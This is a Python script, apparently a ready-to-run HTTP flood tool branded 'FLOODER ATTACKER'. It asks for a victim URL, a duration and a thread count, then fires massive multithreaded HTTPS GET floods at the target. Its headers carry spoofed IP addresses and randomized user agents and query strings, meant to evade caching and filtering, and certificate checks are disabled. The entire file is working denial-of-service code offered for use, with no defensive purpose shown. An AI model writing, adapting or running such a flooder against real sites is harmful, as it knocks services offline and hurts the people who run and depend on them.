import http.client
import urllib.parse
import os
import random
import string
import time
import threading
import ssl
import socket
from pystyle import Colors, Colorate

MAX_REQUESTS_PER_SECOND = 750000
DEFAULT_RANGE = 7500000000
RATELIMIT = 750000

def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner_text = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣦⣴⣶⣾⣿⣶⣶⣶⣶⣦⣤⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡶⠻⠛⠟⠋⠉⠀⠈⠤⠴⠶⠶⢾⣿⣿⣿⣷⣦⠄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠔⠋⠀⠀⠤⠒⠒⢲⠀⠀⠀⢀⣠⣤⣤⣬⣽⣿⣿⣿⣷⣄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣎⢤⣶⣾⠅⠀⠀⢀⡤⠏⠀⠀⠀⠠⣄⣈⡙⠻⢿⣿⣿⣿⣿⣿⣦⠀
⠀⠀⠀⠀⠀⠀⠀⢀⠔⠉⠀⠊⠿⠿⣿⠂⠠⠢⣤⠤⣤⣼⣿⣶⣶⣤⣝⣻⣷⣦⣍⡻⣿⣿⣿⣿⡀
⠀⠀⠀⠀⠀⠀⠀⢾⣾⣆⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢋⢹⠋⠉⠙⢦⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠀⠀⠀⠈⡇⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⢀⣾⣿⣿⠿⠟⠛⠋⠛⢿⣿⣿⠻⣿⣿⣿⣿⡿⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠇⠀⢠⣿⣟⣭⣤⣶⣦⣄⡀⠀⠀⠈⠻⠀⠘⣿⣿⣿⠇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⠤⠊⠀⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠘⣿⠏⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠘⢧⡀⠀⠀⠸⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠐⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠄⣀⡀⠸⠓⠀⠀⠀⠠⠟⠋⠁
          
     PYTHON - ATTACKER | FLOODER ATTACKER (PNHAT)
    """
    print(Colorate.Horizontal(Colors.red_to_green, banner_text))

def get_random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

def get_random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Linux; Android 10; Pixel 3 XL Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36"
    ]
    return random.choice(user_agents)

def generate_random_string(min_length, max_length):
    length = random.randint(min_length, max_length)
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def make_request(target_url, req_range):
    parsed_target = urllib.parse.urlparse(target_url)
    headers = {
        'Host': parsed_target.netloc,
        'Connection': 'keep-alive',
        'HTTP-Version': 'HTTP/1.1',
        'pragma': 'no-cache',
        'upgrade-insecure-requests': '1',
        'accept-encoding': random.choice(["gzip", "deflate", "br"]),
        'cache-control': random.choice(["no-cache", "no-store", "must-revalidate"]),
        'sec-fetch-mode': random.choice(["cors", "navigate", "same-origin"]),
        'sec-fetch-site': random.choice(["same-origin", "none", "cross-site"]),
        'sec-fetch-dest': random.choice(["document", "image", "script"]),
        'user-agent': get_random_user_agent(),
        'x-forwarded-for': get_random_ip(),
        'x-forwarded-host': get_random_ip(),
        'client-ip': get_random_ip(),
        'real-ip': get_random_ip(),
        'via': '1.1 ' + get_random_ip(),
        'referer': parsed_target.scheme + '://' + parsed_target.netloc,
        'origin': parsed_target.scheme + '://' + parsed_target.netloc,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
    }
    path = parsed_target.path + "?" + generate_random_string(3, 10) + "=" + generate_random_string(10, 25)
    try:
        for _ in range(req_range):
            conn = http.client.HTTPSConnection(parsed_target.netloc, context=ssl._create_unverified_context())
            conn.request("GET", path, headers=headers)
            response = conn.getresponse()
            response.read()
            conn.close()
    except Exception as e:
        pass

def flood_requests(target_url, req_range):
    for _ in range(MAX_REQUESTS_PER_SECOND):
        make_request(target_url, req_range)

def run_flooder(target_url, num_threads, req_range=DEFAULT_RANGE):
    for _ in range(num_threads):
        thread = threading.Thread(target=flood_requests, args=(target_url, req_range))
        thread.start()

def exit_script_after_timeout(timeout):
    time.sleep(timeout / 1000)
    print('[1;31mAttack Stoper | Thank To Using Tool.')
    os._exit(0)

if __name__ == "__main__":
    banner()
    target_url = input("[38;2;255;255;255mV[38;2;235;236;253mi[38;2;215;217;251mc[38;2;195;198;249mt[38;2;175;179;247mi[38;2;155;160;245mm[38;2;135;141;243m/[38;2;115;122;241mU[38;2;95;103;239mR[38;2;75;84;237mL[38;2;55;65;235m: [1;37m")
    timeout = int(input("[38;2;255;255;255mD[38;2;231;232;252mu[38;2;207;209;249mr[38;2;183;186;246ma[38;2;159;163;243mt[38;2;135;140;240mi[38;2;111;117;237mo[38;2;87;94;234mn[38;2;63;71;231m: [1;37m")) * 1000
    num_threads = int(input("[38;2;255;255;255mT[38;2;225;227;251mh[38;2;195;199;247mr[38;2;165;171;243me[38;2;135;143;239ma[38;2;105;115;235md[38;2;75;87;231ms[38;2;45;59;227m: [1;37m"))
    print(f"[38;2;222;31;171mS[38;2;214;37;173mU[38;2;206;43;175mC[38;2;198;49;177mC[38;2;190;55;179mE[38;2;182;61;181mS[38;2;174;67;183mS[38;2;166;73;185mF[38;2;158;79;187mU[38;2;150;85;189mL[38;2;142;91;191mL[38;2;134;97;193mY[38;2;126;103;195m [38;2;118;109;197mA[38;2;110;115;199mT[38;2;102;121;201mT[38;2;94;127;203mA[38;2;86;133;205mC[38;2;78;139;207mK[38;2;70;145;209m [38;2;62;151;211mS[38;2;54;157;213mE[38;2;46;163;215mN[38;2;38;169;217mT[38;2;30;175;219m: [1;32m{target_url} [38;2;30;175;219mTime: [1;32m{timeout / 1000}s [38;2;30;175;219mThreads: [1;32m{num_threads}")
    threading.Thread(target=exit_script_after_timeout, args=(timeout,)).start()
    run_flooder(target_url, num_threads)
